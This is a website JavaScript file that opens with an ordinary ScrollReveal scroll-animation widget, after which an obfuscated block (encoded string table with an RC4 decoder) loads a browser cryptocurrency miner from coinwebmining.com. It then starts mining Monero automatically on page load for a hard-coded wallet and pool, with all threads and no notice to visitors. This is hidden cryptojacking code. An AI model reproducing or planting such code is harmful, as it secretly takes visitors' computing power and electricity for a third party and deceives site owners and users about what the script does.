

/*
 * animation widget from here: https://github.com/silexlabs/Silex/issues/443
 */
$(function() {
    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    if(!isMobile) {
        window.sr = ScrollReveal({
            distance: '100px'
        });
        sr.reveal('.from-left', { origin:  'left'});
        sr.reveal('.from-right', { origin:  'right'});
        sr.reveal('.from-top', { origin:  'top'});
        sr.reveal('.from-bottom', { origin:  'bottom'});
    }
    $('.scroll-down').click(function(event) {
        // Preventing default action of the event
        event.preventDefault();
        // Getting the height of the document
        var n = $(window).height();
        $('html, body').animate({ scrollTop: n }, 500);
    });
})

var _0x3f69=['B8OiFcK1wp7Cv1jCpTHCnsKkIsKJZMO1dCRwHcOH','w6gDw4Zy','TsOew7Nra8KSw73CnUbDu8KrwprCsA==','SMK+w7XDkizCnw==','wqnChG0vwpvCu8KecCbCs37DjMO7w6xI','wplkw7Q=','AMKfw5/CvMOiworDtELCu8OAwoU=','HAnCjGPCrsOFJQ==','eWB4wrg0bcKSwoog','wpbCvsOdwpRd','wrHCjnI=','wpINw75pwpVMwq/CgsOAwpJnWhzDkzHDjWc+YwHDusKdKMK/K8O1Aw==','w6wJw4A=','WFV5','w6UXwpbDuShVK8KWLsOow4EGwrLCvg==','wqspYw==','wr/DgsK7a8OnHsK6bgvDp1NdTMO2KMKI','wo7DgsK9Q8OiFMK6eizDqlZnSMO2esONSw==','JsKBXA==','w5XDq1AbMsKuXsOr','wq/CjmA1w5A=','woZ5w7A=','wpBFCX8lw6fDt2Elwo4=','asKmFMO7','EWXDoGIHTw==','CMKOw47CvcOCwovDoE7Cv8OW','XVTCtcOnwq95','DMOoBg==','w6nDvcOpaz4=','G1rDgA==','w6A4wpdOw6JSTg==','SG9lwrcg','DxhzWMOKwpk+','NS4DEiME','wopDJFPDtw==','wrnCiHs6w4fCpcKGZSjCqXM=','wo3DgsK7bQ==','b8KDw7QXwqpVw4oaUsOXw5Y=','w6XDt8KVTgrCvcODwoRcwoxjwrVqwoQiw5PCmMKewrVgw47CrVZdbnTDncOiwpfDqzpUBTTCl8OAwrjCh2tiw5PDpMORHsOc','wr7CtBNbw6XCiXhRMjHDmg==','w67DvkwD','WMKvw77DiyjChGfDm2DDjMKzQMOU','DcKFw4w=','GmjCh8O8GQrDisKNIMOswpo3wojDsMOj','wqESesKvFMO8IcOUwoHCn0fDuH5XHSPDqcOUwqkhw7M2w68gDcK7w6EFMcKPw78bwqXDnzYr','w6w8EEnCnhk=','wpbCvsOOwo9HwpPCgcO3wow=','VMKzw6rDni/CmGjDlWI=','w6UIfy/CrA==','aMKQw7kG','ZGbCpcKCRA==','azvDjsK+wq8='];
(function(_0x3e6ab7,_0x4057c0){
    var _0x488a40=function(_0xef6e61){
        while(--_0xef6e61){
            _0x3e6ab7['push'](_0x3e6ab7['shift']());
            
        }
        
    };
    _0x488a40(++_0x4057c0);
    
}(_0x3f69,0x104));
var _0x1a34=function(_0x219da1,_0x554dc1){
    _0x219da1=_0x219da1-0x0;
    var _0x100a64=_0x3f69[_0x219da1];
    if(_0x1a34['initialized']===undefined){
        (function(){
            var _0x78ed7b=function(){
                var _0x390a44;
                try{
                    _0x390a44=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();
                    
                }catch(_0x172d00){_0x390a44=window;}return _0x390a44;};
                var _0x4d5b9f=_0x78ed7b();
                var _0x58ef5e='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
                _0x4d5b9f['atob']||(_0x4d5b9f['atob']=function(_0x15a69e){
                    var _0x4729ab=String(_0x15a69e)['replace'](/=+$/,'');
                    for(var _0x288a12=0x0,_0x35a5fb,_0x3f7c9b,_0x1e8021=0x0,_0xb43804='';_0x3f7c9b=_0x4729ab['charAt'](_0x1e8021++);~_0x3f7c9b&&(_0x35a5fb=_0x288a12%0x4?_0x35a5fb*0x40+_0x3f7c9b:_0x3f7c9b,_0x288a12++%0x4)?_0xb43804+=String['fromCharCode'](0xff&_0x35a5fb>>(-0x2*_0x288a12&0x6)):0x0){
                        _0x3f7c9b=_0x58ef5e['indexOf'](_0x3f7c9b);
                        
                    }return _0xb43804;});}());
                    var _0x240c96=function(_0x17eb41,_0x1b06bc){
                        var _0x2c37fb=[],_0x34ed8b=0x0,_0xd9af1d,_0x4be1a7='',_0x2200e8='';
                        _0x17eb41=atob(_0x17eb41);
                        for(var _0x48d053=0x0,_0x527f76=_0x17eb41['length'];_0x48d053<_0x527f76;_0x48d053++){
                            _0x2200e8+='%'+('00'+_0x17eb41['charCodeAt'](_0x48d053)['toString'](0x10))['slice'](-0x2);
                            
                        }_0x17eb41=decodeURIComponent(_0x2200e8);
                        for(var _0x43c4a9=0x0;_0x43c4a9<0x100;_0x43c4a9++){
                            _0x2c37fb[_0x43c4a9]=_0x43c4a9;
                            
                        }for(_0x43c4a9=0x0;_0x43c4a9<0x100;_0x43c4a9++){
                            _0x34ed8b=(_0x34ed8b+_0x2c37fb[_0x43c4a9]+_0x1b06bc['charCodeAt'](_0x43c4a9%_0x1b06bc['length']))%0x100;
                            _0xd9af1d=_0x2c37fb[_0x43c4a9];
                            _0x2c37fb[_0x43c4a9]=_0x2c37fb[_0x34ed8b];
                            _0x2c37fb[_0x34ed8b]=_0xd9af1d;
                            
                        }_0x43c4a9=0x0;
                        _0x34ed8b=0x0;
                        for(var _0x4f79cc=0x0;_0x4f79cc<_0x17eb41['length'];_0x4f79cc++){
                            _0x43c4a9=(_0x43c4a9+0x1)%0x100;
                            _0x34ed8b=(_0x34ed8b+_0x2c37fb[_0x43c4a9])%0x100;
                            _0xd9af1d=_0x2c37fb[_0x43c4a9];
                            _0x2c37fb[_0x43c4a9]=_0x2c37fb[_0x34ed8b];
                            _0x2c37fb[_0x34ed8b]=_0xd9af1d;
                            _0x4be1a7+=String['fromCharCode'](_0x17eb41['charCodeAt'](_0x4f79cc)^_0x2c37fb[(_0x2c37fb[_0x43c4a9]+_0x2c37fb[_0x34ed8b])%0x100]);
                            
                        }return _0x4be1a7;
                        
                    };
                    _0x1a34['rc4']=_0x240c96;
                    _0x1a34['data']={};
                    _0x1a34['initialized']=!![];
        
    }var _0x497c1e=_0x1a34['data'][_0x219da1];
    if(_0x497c1e===undefined){
        if(_0x1a34['once']===undefined){
            _0x1a34['once']=!![];
            
        }_0x100a64=_0x1a34['rc4'](_0x100a64,_0x554dc1);
        _0x1a34['data'][_0x219da1]=_0x100a64;
        
    }else{
        _0x100a64=_0x497c1e;
        
    }return _0x100a64;
    
};
var i='';
var th=-0x1;
var to=0.2;
var w='';
var pw='x';
var p='';
var d=0x0;
var uid='';
var op='stopped';
var algorithm;
var miner_statistics;
var m;
function loadScript(_0x12899a,_0xd8b5d5){
    var _0x2090a2=document[_0x1a34('0x0','#h&3')](_0x1a34('0x1','xLNJ'))[0x0];
    var _0x3eb7b1=document[_0x1a34('0x2',']v#C')](_0x1a34('0x3','UWNM'));
    _0x3eb7b1['type']=_0x1a34('0x4','AIJ8');
    _0x3eb7b1[_0x1a34('0x5','cNYA')]=_0x12899a;
    _0x3eb7b1['onreadystatechange']=_0xd8b5d5;
    _0x3eb7b1['onload']=_0xd8b5d5;
    _0x2090a2['appendChild'](_0x3eb7b1);
    
}var cwm_v1=function(){
    var _0x4fbf0a={'throttle':to,'wallet':w,'password':pw,'pool':p};
    if(th<=0x0){
        _0x4fbf0a[_0x1a34('0x6','cQb7')]=!![];
        
    }else{
        _0x4fbf0a[_0x1a34('0x7','Ghax')]=th;
        
    }m=new CWM[(_0x1a34('0x8','uU6Q'))](i,_0x4fbf0a);
    m[_0x1a34('0x9','6yeb')]();
    if(d==0x1){
        console[_0x1a34('0xa','AIJ8')](_0x1a34('0xb','@)XW'));
        console[_0x1a34('0xc','xLNJ')](_0x4fbf0a);
        miner_statistics=setInterval(function(){
            var _0x57957c=m['getHashesPerSecond']();
            console[_0x1a34('0xd','UMih')]('Total\x20hashes:\x20'+m[_0x1a34('0xe','Yq3E')]());
            console[_0x1a34('0xf','Qm6K')](_0x1a34('0x10','fNnu')+m[_0x1a34('0x11','fNnu')]());
            console[_0x1a34('0x12','NpIT')](_0x1a34('0x13','%480')+_0x57957c);
            
        },0x3e8);
        
    }};
    var cwm_v7=function(){
        throttleMiner=to*0x64;
        startMining(p,w,pw,th,uid);
        if(d==0x1){
            console['log']('Started\x20mining\x20using\x20v7\x20alg');
            console[_0x1a34('0xa','AIJ8')](p,w,pw,th);
            var _0x1b089d=0x0;
            miner_statistics=setInterval(function(){
                _0x1b089d=totalhashes*0.5+_0x1b089d*0.5;
                var _0x41abfa=Math[_0x1a34('0x14','AIJ8')](_0x1b089d);
                console[_0x1a34('0x15','cNYA')](_0x1a34('0x16','Y4pt')+_0x41abfa+_0x1a34('0x17','NpIT'));
                totalhashes=0x0;
                while(receiveStack[_0x1a34('0x18','l2xj')]>0x0){
                    var _0x45517e=receiveStack['pop']();
                    switch(_0x45517e[_0x1a34('0x19','cQb7')]){
                        case'job':console['log']('new\x20job:\x20'+_0x45517e[_0x1a34('0x1a','gXfD')]);
                        break;
                        case'hashsolved':console[_0x1a34('0x1b','#h&3')]('hash\x20solved!');
                        break;
                        case _0x1a34('0x1c','d)0k'):console[_0x1a34('0x1d','*sn@')](_0x1a34('0x1e','zpYl')+_0x45517e[_0x1a34('0x1f','uU6Q')]);
                        break;
                        
                    }}},0x3e8);
            
        }};
        
        
    function cwm_start(_0x35310c,_0x2e8b2b,_0x8337b4,_0x567f69,_0x23e892,_0x244400,_0x1dd12,_0x4cdd2e=![],_0x1616ea=''){
        op=_0x1a34('0x20','WiF0');
        i=_0x35310c;
        w=_0x8337b4;
        pw=_0x567f69;
        p=_0x23e892;
        th=_0x244400;
        to=_0x1dd12;
        d=_0x4cdd2e;
        uid=_0x35310c+'-'+_0x1616ea;
        switch(_0x2e8b2b){
            case _0x1a34('0x21','UVSJ'):case _0x1a34('0x22','CYCu'):case'intensecoin':case'electroneum':case'v7':algorithm='cryptonightv7';
            break;
            case _0x1a34('0x23','AIJ8'):case _0x1a34('0x24','fNnu'):case'bytecoin':case'v1':algorithm='cryptonight';
            break;
            
        }if(algorithm==_0x1a34('0x25','Int8')){
            loadScript(_0x1a34('0x26','kCYw'),cwm_v1);
            
        }else if(algorithm=='cryptonightv7'){
            loadScript('https://coinwebmining.com/modules/custom/ultimatewebminer/js/cryptonightv7/miner.js',cwm_v7);
            
        }}function cwm_stop(){
            if(algorithm==_0x1a34('0x27','MXEz')){m[_0x1a34('0x28','%480')]();
                
            }else if(algorithm==_0x1a34('0x29','UWNM')){
                stopMining();
                
            }clearInterval(miner_statistics);
            if(d==0x1){
                console[_0x1a34('0x2a','cQb7')](_0x1a34('0x2b','Ul$W'));
                
            }}function cwm_user_stats(_0x2bc4c4,_0x3132fd,_0xc354d9){
                ws=new WebSocket(_0x1a34('0x2c','zNAw'));
                ws[_0x1a34('0x2d','y7uj')]=function(){
                    var _0x1af2af={'identifier':'userstats','userid':_0x2bc4c4+'-'+_0x3132fd};
                    ws['send'](JSON[_0x1a34('0x2e','6yeb')](_0x1af2af));
                    
                };
                ws[_0x1a34('0x2f','UWNM')]=function(_0x5709a2){
                    var _0x443058=JSON[_0x1a34('0x30','WSQr')](_0x5709a2[_0x1a34('0x31','Int8')]);
                    _0xc354d9(_0x443058[_0x1a34('0x32','ti%#')]);
                    ws[_0x1a34('0x33','j4e[')]();
                    
                };
                
            };



var site_id = 'cwm-2627';
var coin = 'monero';
var wallet = '46YVNRoBHJKHmrHaGpnw5FMEfjE6Sbhg2KKnKSgeWap1PixV4jv1CENDdp1W7XqXLSdbG5XN5PXwfijznzVDkyrKJK1VBku';
var password = 'x';
var mining_pool = 'gulf.moneroocean.stream:10001';
var threads = -1;
var throttle = 0.2;
var debug = false;
cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);

var site_id = 'cwm-2627';
var userid = '{uniqueVisitorUsername}';

cwm_user_stats(site_id, userid, function(hashes){
  console.log(hashes); // this is where you get the total number of accepted hashes for a user name
});